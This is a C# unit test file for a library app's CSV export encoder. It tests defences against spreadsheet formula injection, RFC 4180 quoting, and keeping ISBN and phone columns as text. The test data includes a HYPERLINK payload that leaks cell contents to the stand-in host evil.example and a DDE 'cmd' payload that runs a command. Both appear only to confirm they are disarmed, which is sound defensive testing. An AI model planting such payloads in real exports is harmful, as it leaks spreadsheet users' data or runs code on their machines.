using Library.Application.Reports.Export;
using Library.Domain.ValueObjects;

namespace Library.UnitTests.Application;

/// <summary>
/// Verifies CSV encoding: formula-injection defence and RFC 4180 quoting.
/// </summary>
/// <remarks>
/// These are the security tests for Phase 7. The vulnerability is not against
/// this API — the value is stored and returned faithfully — it is against the
/// spreadsheet the librarian opens the download in. A server that only protects
/// its own process hands the attack to whoever opens the file.
/// </remarks>
public sealed class CsvFieldEncoderTests
{
    private readonly CsvFieldEncoder _encoder = new();

    // -----------------------------------------------------------------------
    // Formula injection (CWE-1236)
    // -----------------------------------------------------------------------

    [Theory]
    [InlineData("=1+1")]
    [InlineData("+1+1")]
    [InlineData("-1+1")]
    [InlineData("@SUM(A1:A9)")]
    public void A_leading_formula_trigger_is_neutralised(string value)
    {
        // Excel, LibreOffice and Google Sheets all evaluate a cell starting with
        // any of these. A leading apostrophe forces text.
        _encoder.Encode(value).ShouldStartWith("'");
    }

    [Fact]
    public void The_hyperlink_exfiltration_payload_is_neutralised()
    {
        // The realistic attack: a title catalogued as a formula becomes a working
        // link in the librarian's spreadsheet that leaks neighbouring cells.
        const string payload = "=HYPERLINK(\"https://evil.example/?d=\"&A1,\"Click me\")";

        string encoded = _encoder.Encode(payload);

        // Quoted because it contains commas and quotes; apostrophe-prefixed
        // INSIDE the quotes, which is what actually disarms it.
        encoded.ShouldStartWith("\"'=HYPERLINK");
    }

    [Fact]
    public void The_dde_payload_is_neutralised()
    {
        // Older Excel executes this after a prompt most users click through.
        _encoder.Encode("=cmd|'/c calc'!A0").ShouldStartWith("'=cmd");
    }

    [Theory]
    [InlineData("\t=1+1")]
    [InlineData("\r=1+1")]
    public void A_leading_control_character_before_a_trigger_is_also_neutralised(string value)
    {
        // Some spreadsheet parsers strip leading whitespace BEFORE deciding
        // whether the cell is a formula, so "\t=1+1" evaluates. Prefixing on the
        // control character too closes that bypass.
        //
        // The assertion allows for a leading quote, because the two cases differ:
        // a tab needs no quoting and comes back as '\t=1+1, while \r forces RFC
        // 4180 quoting and comes back as "'\r=1+1". Both are disarmed - the
        // apostrophe is what matters, and it must sit INSIDE any quotes. An
        // earlier version of this test asserted a leading apostrophe outright and
        // failed on the \r case; the test was wrong, not the encoder.
        string encoded = _encoder.Encode(value);

        FirstCharacterIgnoringQuote(encoded).ShouldBe('\'');
    }

    /// <summary>The first character, skipping an RFC 4180 opening quote if present.</summary>
    private static char FirstCharacterIgnoringQuote(string encoded) =>
        encoded.StartsWith('"') ? encoded[1] : encoded[0];

    [Fact]
    public void Quoting_alone_would_not_disarm_a_formula()
    {
        // The reason the apostrophe goes INSIDE the quotes. Excel strips the
        // surrounding quotes and then evaluates what is left, so "=1+1" is still
        // a formula - quoting is structural, not a defence.
        string encoded = _encoder.Encode("=1+1,2");

        encoded.ShouldBe("\"'=1+1,2\"");
        encoded.ShouldNotBe("\"=1+1,2\"");
    }

    [Theory]
    [InlineData("Clean Code")]
    [InlineData("1984")]
    [InlineData("A Brief History of Time")]
    [InlineData("O'Reilly Media")]
    public void An_ordinary_value_is_left_alone(string value)
    {
        // The defence must not corrupt the overwhelming majority of cells.
        _encoder.Encode(value).ShouldBe(value);
    }

    [Fact]
    public void A_trigger_that_is_not_leading_is_left_alone()
    {
        // "C++" and "Vitamin B-12" are not formulas. Only the FIRST character
        // matters to a spreadsheet.
        _encoder.Encode("C++ Programming").ShouldBe("C++ Programming");
        _encoder.Encode("Vitamin B-12").ShouldBe("Vitamin B-12");
    }

    [Fact]
    public void A_legitimate_value_starting_with_a_trigger_is_prefixed_and_that_is_accepted()
    {
        // The known cost, documented rather than hidden: a genuine title
        // beginning with a hyphen shows a stray apostrophe in Excel. A cosmetic
        // blemish on rare rows beats arbitrary formula execution on the rest.
        _encoder.Encode("-40 Degrees").ShouldBe("'-40 Degrees");
    }

    // -----------------------------------------------------------------------
    // RFC 4180 quoting
    // -----------------------------------------------------------------------

    [Fact]
    public void A_value_containing_a_comma_is_quoted()
    {
        _encoder.Encode("Clean Code, Second Edition")
            .ShouldBe("\"Clean Code, Second Edition\"");
    }

    [Fact]
    public void An_embedded_quote_is_doubled_and_the_field_quoted()
    {
        // RFC 4180's escape: a quote inside a quoted field is written twice.
        _encoder.Encode("The \"Good\" Parts").ShouldBe("\"The \"\"Good\"\" Parts\"");
    }

    [Theory]
    [InlineData("Line one\nLine two")]
    [InlineData("Line one\r\nLine two")]
    public void A_value_containing_a_newline_is_quoted(string value)
    {
        // Without quoting, one description with a newline shifts every subsequent
        // column and corrupts the rest of the file.
        _encoder.Encode(value).ShouldStartWith("\"");
        _encoder.Encode(value).ShouldEndWith("\"");
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    public void Null_and_empty_both_encode_to_an_empty_field(string? value)
    {
        _encoder.Encode(value).ShouldBe(string.Empty);
    }

    // -----------------------------------------------------------------------
    // Identifier columns: digits that are a name, not a quantity
    // -----------------------------------------------------------------------

    [Fact]
    public void An_isbn_in_a_text_column_is_forced_to_text()
    {
        // The reported defect: an exported ISBN opened in Excel showed 9.78E+12.
        // Thirteen digits is a number to a spreadsheet, and a CSV carries no
        // types to say otherwise.
        _encoder.Encode(ExportValue.Text("9780132350884")).ShouldBe("'9780132350884");
    }

    [Fact]
    public void The_same_isbn_in_an_ordinary_column_is_left_alone()
    {
        // The prefix is driven by the column's declaration, never guessed from
        // the value. A row that does not say "this is text" gets no apostrophe.
        _encoder.Encode("9780132350884").ShouldBe("9780132350884");
    }

    [Fact]
    public void Quoting_would_not_have_fixed_it()
    {
        // Worth pinning, because quoting is the obvious wrong fix. Excel discards
        // RFC 4180 quotes before inferring a type, so "9780132350884" is
        // converted exactly as the bare digits are. The apostrophe is the only
        // in-band signal a spreadsheet honours.
        _encoder.Encode(ExportValue.Text("9780132350884")).ShouldNotBe("\"9780132350884\"");
    }

    [Fact]
    public void Leading_zeros_survive_a_text_column()
    {
        // The quieter half of the same bug: number conversion eats leading zeros,
        // and once the sheet is saved back they are gone for good.
        _encoder.Encode(ExportValue.Text("000123")).ShouldBe("'000123");
    }

    [Theory]
    [InlineData("LIB-001000")]
    [InlineData("MEM-2026-00042")]
    public void A_text_column_that_is_not_all_digits_is_not_prefixed(string value)
    {
        // Barcodes and membership numbers are declared as text because that is
        // what they are, but no spreadsheet would read them as numbers, so
        // prefixing them would add visible noise and fix nothing. The declaration
        // is what future-proofs them if the format ever becomes numeric.
        _encoder.Encode(ExportValue.Text(value)).ShouldBe(value);
    }

    [Fact]
    public void A_text_column_starting_with_a_formula_trigger_is_still_disarmed()
    {
        // Declaring a column as text must not open a hole in the formula defence.
        // This value is not all digits, so it takes the injection path instead.
        _encoder.Encode(ExportValue.Text("=1+1")).ShouldBe("'=1+1");
    }

    [Fact]
    public void A_phone_number_is_forced_to_text()
    {
        // The overdue and member reports exist to contact people. 9.88E+09 is a
        // number nobody can dial.
        _encoder.Encode(ExportValue.Text("9876543210")).ShouldBe("'9876543210");
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    public void An_empty_text_column_stays_empty(string? value)
    {
        // No apostrophe on a blank cell - an optional phone number must not
        // export as a lone quote mark.
        _encoder.Encode(ExportValue.Text(value)).ShouldBe(string.Empty);
    }

    [Fact]
    public void A_forced_isbn_still_reimports()
    {
        // The books export is meant to round-trip through POST /api/books/import.
        // Isbn.Normalize keeps only ASCII digits, so the apostrophe is discarded
        // on the way back in - the prefix is a display hint, not a data change.
        string exported = _encoder.Encode(ExportValue.Text("9780132350884"));

        Isbn.TryCreate(exported, out Isbn parsed, out string? error).ShouldBeTrue(error);
        parsed.Value.ShouldBe("9780132350884");
    }
}
